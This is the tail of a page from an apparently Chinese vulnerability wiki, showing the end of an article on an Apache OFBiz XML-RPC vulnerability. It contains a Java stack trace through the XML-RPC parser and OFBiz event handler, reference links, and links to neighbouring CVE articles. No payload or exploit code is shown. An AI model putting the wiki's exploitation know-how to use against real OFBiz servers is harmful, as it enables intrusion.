<span class="w">    </span><span class="nx">at</span><span class="w"> </span><span class="nx">org</span><span class="p">.</span><span class="nx">apache</span><span class="p">.</span><span class="nx">xmlrpc</span><span class="p">.</span><span class="nx">parser</span><span class="p">.</span><span class="nx">XmlRpcRequestParser</span><span class="p">.</span><span class="nx">endElement</span><span class="p">(</span><span class="nx">XmlRpcRequestParser</span><span class="p">.</span><span class="nx">java</span><span class="p">:</span><span class="mi">165</span><span class="p">)</span><span class="w"> </span><span class="o">~</span><span class="p">[</span><span class="nx">xmlrpc</span><span class="o">-</span><span class="nx">common</span><span class="o">-</span><span class="m m-Double">3.1.3</span><span class="p">.</span><span class="nx">jar</span><span class="p">:</span><span class="m m-Double">3.1.3</span><span class="p">]</span>
<span class="w">    </span><span class="nx">at</span><span class="w"> </span><span class="nx">org</span><span class="p">.</span><span class="nx">apache</span><span class="p">.</span><span class="nx">xerces</span><span class="p">.</span><span class="nx">parsers</span><span class="p">.</span><span class="nx">AbstractSAXParser</span><span class="p">.</span><span class="nx">endElement</span><span class="p">(</span><span class="nx">Unknown</span><span class="w"> </span><span class="nx">Source</span><span class="p">)</span><span class="w"> </span><span class="o">~</span><span class="p">[</span><span class="nx">xercesImpl</span><span class="o">-</span><span class="m m-Double">2.9.1</span><span class="p">.</span><span class="nx">jar</span><span class="p">:?]</span>
<span class="w">    </span><span class="nx">at</span><span class="w"> </span><span class="nx">org</span><span class="p">.</span><span class="nx">apache</span><span class="p">.</span><span class="nx">xerces</span><span class="p">.</span><span class="kd">impl</span><span class="p">.</span><span class="nx">XMLNSDocumentScannerImpl</span><span class="p">.</span><span class="nx">scanEndElement</span><span class="p">(</span><span class="nx">Unknown</span><span class="w"> </span><span class="nx">Source</span><span class="p">)</span><span class="w"> </span><span class="o">~</span><span class="p">[</span><span class="nx">xercesImpl</span><span class="o">-</span><span class="m m-Double">2.9.1</span><span class="p">.</span><span class="nx">jar</span><span class="p">:?]</span>
<span class="w">    </span><span class="nx">at</span><span class="w"> </span><span class="nx">org</span><span class="p">.</span><span class="nx">apache</span><span class="p">.</span><span class="nx">xerces</span><span class="p">.</span><span class="kd">impl</span><span class="p">.</span><span class="nx">XMLDocumentFragmentScannerImpl</span><span class="err">$</span><span class="nx">FragmentContentDispatcher</span><span class="p">.</span><span class="nx">dispatch</span><span class="p">(</span><span class="nx">Unknown</span><span class="w"> </span><span class="nx">Source</span><span class="p">)</span><span class="w"> </span><span class="o">~</span><span class="p">[</span><span class="nx">xercesImpl</span><span class="o">-</span><span class="m m-Double">2.9.1</span><span class="p">.</span><span class="nx">jar</span><span class="p">:?]</span>
<span class="w">    </span><span class="nx">at</span><span class="w"> </span><span class="nx">org</span><span class="p">.</span><span class="nx">apache</span><span class="p">.</span><span class="nx">xerces</span><span class="p">.</span><span class="kd">impl</span><span class="p">.</span><span class="nx">XMLDocumentFragmentScannerImpl</span><span class="p">.</span><span class="nx">scanDocument</span><span class="p">(</span><span class="nx">Unknown</span><span class="w"> </span><span class="nx">Source</span><span class="p">)</span><span class="w"> </span><span class="o">~</span><span class="p">[</span><span class="nx">xercesImpl</span><span class="o">-</span><span class="m m-Double">2.9.1</span><span class="p">.</span><span class="nx">jar</span><span class="p">:?]</span>
<span class="w">    </span><span class="nx">at</span><span class="w"> </span><span class="nx">org</span><span class="p">.</span><span class="nx">apache</span><span class="p">.</span><span class="nx">xerces</span><span class="p">.</span><span class="nx">parsers</span><span class="p">.</span><span class="nx">XML11Configuration</span><span class="p">.</span><span class="nx">parse</span><span class="p">(</span><span class="nx">Unknown</span><span class="w"> </span><span class="nx">Source</span><span class="p">)</span><span class="w"> </span><span class="o">~</span><span class="p">[</span><span class="nx">xercesImpl</span><span class="o">-</span><span class="m m-Double">2.9.1</span><span class="p">.</span><span class="nx">jar</span><span class="p">:?]</span>
<span class="w">    </span><span class="nx">at</span><span class="w"> </span><span class="nx">org</span><span class="p">.</span><span class="nx">apache</span><span class="p">.</span><span class="nx">xerces</span><span class="p">.</span><span class="nx">parsers</span><span class="p">.</span><span class="nx">XML11Configuration</span><span class="p">.</span><span class="nx">parse</span><span class="p">(</span><span class="nx">Unknown</span><span class="w"> </span><span class="nx">Source</span><span class="p">)</span><span class="w"> </span><span class="o">~</span><span class="p">[</span><span class="nx">xercesImpl</span><span class="o">-</span><span class="m m-Double">2.9.1</span><span class="p">.</span><span class="nx">jar</span><span class="p">:?]</span>
<span class="w">    </span><span class="nx">at</span><span class="w"> </span><span class="nx">org</span><span class="p">.</span><span class="nx">apache</span><span class="p">.</span><span class="nx">xerces</span><span class="p">.</span><span class="nx">parsers</span><span class="p">.</span><span class="nx">XMLParser</span><span class="p">.</span><span class="nx">parse</span><span class="p">(</span><span class="nx">Unknown</span><span class="w"> </span><span class="nx">Source</span><span class="p">)</span><span class="w"> </span><span class="o">~</span><span class="p">[</span><span class="nx">xercesImpl</span><span class="o">-</span><span class="m m-Double">2.9.1</span><span class="p">.</span><span class="nx">jar</span><span class="p">:?]</span>
<span class="w">    </span><span class="nx">at</span><span class="w"> </span><span class="nx">org</span><span class="p">.</span><span class="nx">apache</span><span class="p">.</span><span class="nx">xerces</span><span class="p">.</span><span class="nx">parsers</span><span class="p">.</span><span class="nx">AbstractSAXParser</span><span class="p">.</span><span class="nx">parse</span><span class="p">(</span><span class="nx">Unknown</span><span class="w"> </span><span class="nx">Source</span><span class="p">)</span><span class="w"> </span><span class="o">~</span><span class="p">[</span><span class="nx">xercesImpl</span><span class="o">-</span><span class="m m-Double">2.9.1</span><span class="p">.</span><span class="nx">jar</span><span class="p">:?]</span>
<span class="w">    </span><span class="nx">at</span><span class="w"> </span><span class="nx">org</span><span class="p">.</span><span class="nx">apache</span><span class="p">.</span><span class="nx">xerces</span><span class="p">.</span><span class="nx">jaxp</span><span class="p">.</span><span class="nx">SAXParserImpl</span><span class="err">$</span><span class="nx">JAXPSAXParser</span><span class="p">.</span><span class="nx">parse</span><span class="p">(</span><span class="nx">Unknown</span><span class="w"> </span><span class="nx">Source</span><span class="p">)</span><span class="w"> </span><span class="o">~</span><span class="p">[</span><span class="nx">xercesImpl</span><span class="o">-</span><span class="m m-Double">2.9.1</span><span class="p">.</span><span class="nx">jar</span><span class="p">:?]</span>
<span class="w">    </span><span class="nx">at</span><span class="w"> </span><span class="nx">org</span><span class="p">.</span><span class="nx">apache</span><span class="p">.</span><span class="nx">ofbiz</span><span class="p">.</span><span class="nx">webapp</span><span class="p">.</span><span class="nx">event</span><span class="p">.</span><span class="nx">XmlRpcEventHandler</span><span class="p">.</span><span class="nx">getRequest</span><span class="p">(</span><span class="nx">XmlRpcEventHandler</span><span class="p">.</span><span class="nx">java</span><span class="p">:</span><span class="mi">285</span><span class="p">)</span><span class="w"> </span><span class="o">~</span><span class="p">[</span><span class="nx">ofbiz</span><span class="p">.</span><span class="nx">jar</span><span class="p">:?]</span>
<span class="w">    </span><span class="nx">at</span><span class="w"> </span><span class="nx">org</span><span class="p">.</span><span class="nx">apache</span><span class="p">.</span><span class="nx">ofbiz</span><span class="p">.</span><span class="nx">webapp</span><span class="p">.</span><span class="nx">event</span><span class="p">.</span><span class="nx">XmlRpcEventHandler</span><span class="p">.</span><span class="nx">execute</span><span class="p">(</span><span class="nx">XmlRpcEventHandler</span><span class="p">.</span><span class="nx">java</span><span class="p">:</span><span class="mi">229</span><span class="p">)</span><span class="w"> </span><span class="p">[</span><span class="nx">ofbiz</span><span class="p">.</span><span class="nx">jar</span><span class="p">:?]</span>
<span class="w">    </span><span class="nx">at</span><span class="w"> </span><span class="nx">org</span><span class="p">.</span><span class="nx">apache</span><span class="p">.</span><span class="nx">ofbiz</span><span class="p">.</span><span class="nx">webapp</span><span class="p">.</span><span class="nx">event</span><span class="p">.</span><span class="nx">XmlRpcEventHandler</span><span class="p">.</span><span class="nx">invoke</span><span class="p">(</span><span class="nx">XmlRpcEventHandler</span><span class="p">.</span><span class="nx">java</span><span class="p">:</span><span class="mi">145</span><span class="p">)</span><span class="w"> </span><span class="p">[</span><span class="nx">ofbiz</span><span class="p">.</span><span class="nx">jar</span><span class="p">:?]</span>
<span class="w">    </span><span class="nx">at</span><span class="w"> </span><span class="nx">org</span><span class="p">.</span><span class="nx">apache</span><span class="p">.</span><span class="nx">ofbiz</span><span class="p">.</span><span class="nx">webapp</span><span class="p">.</span><span class="nx">control</span><span class="p">.</span><span class="nx">RequestHandler</span><span class="p">.</span><span class="nx">runEvent</span><span class="p">(</span><span class="nx">RequestHandler</span><span class="p">.</span><span class="nx">java</span><span class="p">:</span><span class="mi">741</span><span class="p">)</span><span class="w"> </span><span class="p">[</span><span class="nx">ofbiz</span><span class="p">.</span><span class="nx">jar</span><span class="p">:?]</span>
<span class="w">    </span><span class="nx">at</span><span class="w"> </span><span class="nx">org</span><span class="p">.</span><span class="nx">apache</span><span class="p">.</span><span class="nx">ofbiz</span><span class="p">.</span><span class="nx">webapp</span><span class="p">.</span><span class="nx">control</span><span class="p">.</span><span class="nx">RequestHandler</span><span class="p">.</span><span class="nx">doRequest</span><span class="p">(</span><span class="nx">RequestHandler</span><span class="p">.</span><span class="nx">java</span><span class="p">:</span><span class="mi">465</span><span class="p">)</span><span class="w"> </span><span class="p">[</span><span class="nx">ofbiz</span><span class="p">.</span><span class="nx">jar</span><span class="p">:?]</span>
<span class="w">    </span><span class="nx">at</span><span class="w"> </span><span class="nx">org</span><span class="p">.</span><span class="nx">apache</span><span class="p">.</span><span class="nx">ofbiz</span><span class="p">.</span><span class="nx">webapp</span><span class="p">.</span><span class="nx">control</span><span class="p">.</span><span class="nx">ControlServlet</span><span class="p">.</span><span class="nx">doGet</span><span class="p">(</span><span class="nx">ControlServlet</span><span class="p">.</span><span class="nx">java</span><span class="p">:</span><span class="mi">217</span><span class="p">)</span><span class="w"> </span><span class="p">[</span><span class="nx">ofbiz</span><span class="p">.</span><span class="nx">jar</span><span class="p">:?]</span>
<span class="w">    </span><span class="nx">at</span><span class="w"> </span><span class="nx">org</span><span class="p">.</span><span class="nx">apache</span><span class="p">.</span><span class="nx">ofbiz</span><span class="p">.</span><span class="nx">webapp</span><span class="p">.</span><span class="nx">control</span><span class="p">.</span><span class="nx">ControlServlet</span><span class="p">.</span><span class="nx">doPost</span><span class="p">(</span><span class="nx">ControlServlet</span><span class="p">.</span><span class="nx">java</span><span class="p">:</span><span class="mi">91</span><span class="p">)</span><span class="w"> </span><span class="p">[</span><span class="nx">ofbiz</span><span class="p">.</span><span class="nx">jar</span><span class="p">:?]</span>
</code></pre></div>

<h2 id="_7">参考链接<a class="headerlink" href="#_7" title="Permanent link">&para;</a></h2>
<blockquote>
<p><a href="https://xz.aliyun.com/t/8324">https://xz.aliyun.com/t/8324</a>#toc-9</p>
<p><a href="https://blog.csdn.net/caiqiiqi/article/details/108646579">https://blog.csdn.net/caiqiiqi/article/details/108646579</a></p>
<p><a href="https://xz.aliyun.com/t/8184/">https://xz.aliyun.com/t/8184/</a>#toc-4</p>
</blockquote>

  <br>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="../../Apache%20POI/%EF%BC%88CVE-2019-12415%EF%BC%89Apache%20POI%20_%3D%204.1.0%20XXE%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="../../Apache%20POI/%EF%BC%88CVE-2019-12415%EF%BC%89Apache%20POI%20_%3D%204.1.0%20XXE%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
        （CVE-2019-12415）Apache POI \&lt;= 4.1.0 XXE漏洞
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../%28CVE-2021-26295%29Apache%20OFBiz%20RMI%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../%28CVE-2021-26295%29Apache%20OFBiz%20RMI%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
        Apache OFBiz RMI反序列化漏洞 CVE-2021-26295
      </a>
    </div>
    
  </div>

    <br>
</div>

<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
</footer>

</body>
</html>